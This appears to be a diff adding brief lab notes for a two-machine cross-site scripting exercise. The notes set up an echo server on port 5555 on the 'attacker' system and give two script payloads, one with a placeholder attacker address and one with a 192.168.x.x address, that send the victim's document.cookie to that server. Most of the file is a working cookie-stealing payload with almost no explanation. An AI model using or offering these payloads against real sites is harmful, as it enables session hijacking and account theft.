@@ -1,0 +1,25 @@
+#Two machines required
+
+
+# On attacker system, run the Web Server/Echo Server
+tar xvf echoserv.tar
+cd echoserver
+make
+./echoserv 5555
+
+
+-------------
+On Victim
+
+
+<script>document.write(’<img src=http://attacker_IP_address:5555?c=’
++ escape(document.cookie) + ’ >’);
+</script>
+
+
+<script>document.write('<img src=http://192.168.181.142:5555?c='+ escape(document.cookie) + ' >');
+</script>
+
+----------------------------------------------
+
+The attacker will now have response on its console
